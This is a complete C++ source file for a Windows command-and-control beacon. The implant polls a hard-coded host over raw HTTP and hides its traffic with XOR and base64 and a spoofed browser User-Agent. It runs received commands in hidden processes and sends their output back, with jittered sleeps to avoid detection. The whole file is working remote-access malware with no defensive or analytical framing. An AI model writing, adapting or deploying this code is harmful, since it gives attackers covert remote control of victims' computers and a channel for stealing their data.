// language: C++, file: beacon.cpp, target: Windows 11, MSVC
// C2 beacon — raw Winsock HTTP(S) polling, XOR+base64 obfuscation, task executor
// link: ws2_32.lib
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdio>
#include <string>
#include <vector>
#include <random>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

static const char* C2_HOST = "10.10.13.37";
static const int   C2_PORT = 8443;
static const int   HEARTBEAT_MS = 30000;
static const char  XOR_KEY = 0x5A;

// ---- obfuscation ----
static std::string B64Encode(const std::vector<BYTE>& in) {
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, bits = 0;
    for (BYTE b : in) {
        val = (val << 8) | b; bits += 8;
        while (bits >= 6) { bits -= 6; out += tbl[(val >> bits) & 0x3F]; }
    }
    if (bits) out += tbl[(val << (6 - bits)) & 0x3F];
    while (out.size() % 4) out += '=';
    return out;
}

static std::vector<BYTE> B64Decode(const std::string& in) {
    static int tbl[256];
    static bool init = false;
    if (!init) {
        for (int i = 0; i < 256; i++) tbl[i] = -1;
        const char* s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for (int i = 0; i < 64; i++) tbl[(BYTE)s[i]] = i;
        init = true;
    }
    std::vector<BYTE> out;
    int val = 0, bits = 0;
    for (char c : in) {
        if (c == '=') break;
        int d = tbl[(BYTE)c];
        if (d < 0) continue;
        val = (val << 6) | d; bits += 6;
        if (bits >= 8) { bits -= 8; out.push_back((BYTE)((val >> bits) & 0xFF)); }
    }
    return out;
}

static std::vector<BYTE> Xor(const std::vector<BYTE>& in) {
    std::vector<BYTE> out = in;
    for (auto& b : out) b ^= XOR_KEY;
    return out;
}

// ---- http over raw socket ----
static bool HttpPost(const std::string& path, const std::string& body, std::string& resp) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)C2_PORT);
    inet_pton(AF_INET, C2_HOST, &sa.sin_addr);
    if (connect(s, (sockaddr*)&sa, sizeof(sa)) != 0) { closesocket(s); return false; }

    std::string req = "POST " + path + " HTTP/1.1\r\n"
        "Host: " + std::string(C2_HOST) + "\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: " + std::to_string(body.size()) + "\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Connection: close\r\n\r\n" + body;
    send(s, req.data(), (int)req.size(), 0);

    char buf[4096];
    resp.clear();
    int n;
    while ((n = recv(s, buf, sizeof(buf), 0)) > 0) resp.append(buf, n);
    closesocket(s);

    auto hdr = resp.find("\r\n\r\n");
    if (hdr != std::string::npos) resp = resp.substr(hdr + 4);
    return true;
}

// ---- task executor ----
static std::string Exec(const std::string& cmd) {
    std::string out;
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    HANDLE rd, wr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return out;
    SetHandleInformation(wr, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    STARTUPINFOW si{ sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = wr;
    si.hStdError = wr;
    PROCESS_INFORMATION pi{};
    std::wstring wcmd(cmd.begin(), cmd.end());
    if (CreateProcessW(nullptr, wcmd.data(), nullptr, nullptr, TRUE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(wr);
        char c;
        DWORD read = 0;
        while (ReadFile(rd, &c, 1, &read, nullptr) && read) out += c;
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        CloseHandle(wr);
    }
    CloseHandle(rd);
    return out;
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    std::mt19937 rng((unsigned)GetTickCount());
    std::uniform_int_distribution<int> jitter(-5000, 5000);

    std::string id = "win-" + std::to_string(GetCurrentProcessId());
    for (;;) {
        // beacon in: just the id
        std::string body = B64Encode(Xor(std::vector<BYTE>(id.begin(), id.end())));
        std::string resp;
        if (HttpPost("/beacon", body, resp)) {
            auto task = Xor(B64Decode(resp));
            std::string t(task.begin(), task.end());
            if (!t.empty() && t != "NONE") {
                std::string result = Exec(t);
                std::string rb = B64Encode(Xor(std::vector<BYTE>(result.begin(), result.end())));
                HttpPost("/result", rb, resp);
            }
        }
        int delay = HEARTBEAT_MS + jitter(rng);
        if (delay < 5000) delay = 5000;
        Sleep(delay);
    }
}
